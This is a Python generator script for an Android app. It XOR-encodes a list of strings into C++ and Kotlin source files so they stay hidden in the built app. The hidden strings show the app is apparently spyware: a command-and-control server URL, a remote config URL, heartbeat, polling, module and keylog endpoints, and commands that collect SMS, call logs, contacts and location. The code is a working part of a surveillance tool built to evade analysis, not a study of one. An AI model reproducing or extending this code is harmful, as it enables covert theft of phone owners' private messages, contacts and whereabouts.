#!/usr/bin/env python3
"""
Regenerate cpp/string_table.h + kotlin/StringIds.kt dari daftar plaintext.
Update STRINGS list di bawah lalu jalankan: python3 tools/gen_strings.py
Output ditulis ke android/app/src/main/cpp/string_table.h dan
                  android/app/src/main/kotlin/com/nexlink/bridge/StringIds.kt
"""
import os

STRINGS = [
    ("configUrl",         "https://raw.githubusercontent.com/Kztutorial99/AndroidControl/main/android-config.json"),
    ("apiKeyEndpoint",    "/api/tk"),
    ("apiHeartbeat",      "/api/device/heartbeat"),
    ("apiPoll",           "/api/device/poll?deviceId="),
    ("apiModule",         "/api/module/"),
    ("apiResult",         "/api/device/result"),
    ("apiKeylog",         "/api/device/keylog"),
    ("prefsName",         "app_state"),
    ("prefsKeyId",        "cid"),
    ("mainPrefsName",     "connector_prefs"),
    ("cmdSms",            "get_sms"),
    ("cmdSmsPrefix",      "get_sms:"),
    ("cmdCalls",          "get_calls"),
    ("cmdCallsPrefix",    "get_calls:"),
    ("cmdContacts",       "get_contacts"),
    ("cmdContactsPrefix", "get_contacts:"),
    ("cmdLocation",       "get_location"),
    ("cmdResult",         "command_result"),
    ("wakeLock",          "IWXPanel:WakeLock"),
    ("wakeScreen",        "IWXPanel:WakeScraen"),
    ("panelTag",          "IWX Panel"),
    ("brandTag",          "By IWX TEAM"),
    ("msgOk",             "OK"),
    ("msgDenied",         "Permission denied"),
    ("__serverUrl",       "https://android-ctrl-proxy.xyraofficialsup.workers.dev"),
]

def roll(i): return ((i*0x5B) ^ 0x3D ^ ((i>>3)*0x11)) & 0xFF
def enc(s):
    b = s.encode("utf-8")
    return bytes(b[i] ^ (0xA7 ^ roll(i)) for i in range(len(b)))

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CPP  = os.path.join(ROOT, "src/main/cpp/string_table.h")
KT   = os.path.join(ROOT, "src/main/kotlin/com/nexlink/bridge/StringIds.kt")

cpp = ["// AUTO-GENERATED — do not edit; run tools/gen_strings.py",
       "#pragma once", "#include <stdint.h>", "#include <stddef.h>", "",
       "enum StringId : int {"]
for i,(n,_) in enumerate(STRINGS): cpp.append(f"    SID_{n} = {i},")
cpp += [f"    SID_COUNT = {len(STRINGS)}", "};", "",
        "struct ObfEntry { const uint8_t* data; size_t len; };", ""]
for i,(_,v) in enumerate(STRINGS):
    b = enc(v); arr = ", ".join(f"0x{x:02X}" for x in b)
    cpp.append(f"static const uint8_t g_s{i}[] = {{ {arr} }};")
cpp += ["", "static const ObfEntry g_obf_table[SID_COUNT] = {"]
for i,_ in enumerate(STRINGS): cpp.append(f"    {{ g_s{i}, sizeof(g_s{i}) }},")
cpp += ["};", ""]
open(CPP,"w").write("\n".join(cpp))

kt = ["// AUTO-GENERATED — do not edit; run tools/gen_strings.py",
      "package com.nexlink.bridge", "", "internal object StringIds {"]
for i,(n,_) in enumerate(STRINGS): kt.append(f"    const val {n.upper()} = {i}")
kt += ["}", ""]
open(KT,"w").write("\n".join(kt))
print(f"wrote {CPP}\nwrote {KT}\n{len(STRINGS)} strings")
